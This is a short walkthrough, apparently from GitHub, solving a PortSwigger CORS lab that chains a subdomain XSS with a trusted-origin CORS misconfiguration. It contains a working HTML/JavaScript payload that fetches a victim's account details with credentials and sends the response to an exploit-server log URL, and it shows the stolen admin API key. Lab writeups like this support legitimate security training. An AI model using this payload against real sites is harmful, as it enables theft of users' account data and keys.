## Welcome, my friend. Today we will start the [3. CORS lab](https://portswigger.net/web-security/cors/lab-breaking-https-attack) in ```portswigger```
### Let's play this lab:

![image](https://github.com/user-attachments/assets/93a66c73-1608-4702-9fe1-f9a8acbe66a4)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/de021de7-334f-473b-9d54-e1a198483708)

#### We can log in to our account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/ef7301e5-b6b7-45c9-a885-d88d2cf98df6)


### Now, We will use ```burp suite``` and intercept this requst:

![image](https://github.com/user-attachments/assets/3e9e083b-dc48-45d9-82d2-8ce07efab0e4)

## Try add origin header in header request such as:

```
Origin: http://mohamed.0a72003903ce516d814ec600009800d0.web-security-academy.net
```

![image](https://github.com/user-attachments/assets/8fd6fef1-9b7e-475c-92bb-7c7926e879b3)


### This website is weak with CORS vulnerability , Now go to server exploit and add this code:

```
<html>
<body>
<script>
    document.location="http://stock.0a72003903ce516d814ec600009800d0.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a72003903ce516d814ec600009800d0.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ab2000d033c511c81c9c59e01520099.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
</body>
</html>
```

### enter ```sotre``` and ```Deliver exploit to vitim``` then ```access log```:

![image](https://github.com/user-attachments/assets/75588a51-fd41-41e0-a117-279b4a09d4ce)


### api of administrator: ```QMTKzy5Ivjv4byzmXkoN6ZA8w0ToTALr```

![image](https://github.com/user-attachments/assets/3ed315c1-4dea-4cb7-a6c3-b7f8a5e5fc1c)

![image](https://github.com/user-attachments/assets/8678c5a8-08d0-4648-97ed-fdc1ffbb1d2d)



-------

### Done! Congratulations, friends‚ù§Ô∏è‚Äçüî•

<p align="center">
<img src="https://github.com/user-attachments/assets/15a03813-a959-4628-9018-708548137ba0" >
</p>
